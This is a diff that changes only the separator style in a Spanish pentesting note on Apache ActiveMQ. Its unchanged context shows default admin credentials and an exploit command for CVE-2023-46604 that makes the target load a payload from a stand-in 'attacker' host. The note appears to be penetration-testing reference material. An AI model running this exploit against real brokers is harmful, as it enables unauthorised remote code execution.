@@ -14,7 +14,7 @@ linked:
 > [!info]
 > **Apache ActiveMQ** — message broker JMS. Puerto OpenWire default **61616**. CVE-2023-46604 (CVSS 10.0): RCE pre-auth via deserialization de mensajes OpenWire.
 
-***
+---
 
 ## Recon
 
@@ -27,7 +27,7 @@ curl http://<target>:8161/admin/
 # Default creds: admin:admin
 ```
 
-***
+---
 
 ## CVE-2023-46604 (RCE pre-auth)
 
@@ -64,7 +64,7 @@ EOF
 ./ActiveMQ-RCE -i <target> -p 61616 -u http://attacker:8888/poc.xml
 ```
 
-***
+---
 
 ## Otros vectores
 
@@ -72,7 +72,7 @@ EOF
 - Auth bypass CVE-2022-41678
 - JMX management port (1099)
 
-***
+---
 
 ## Notas Relacionadas
 
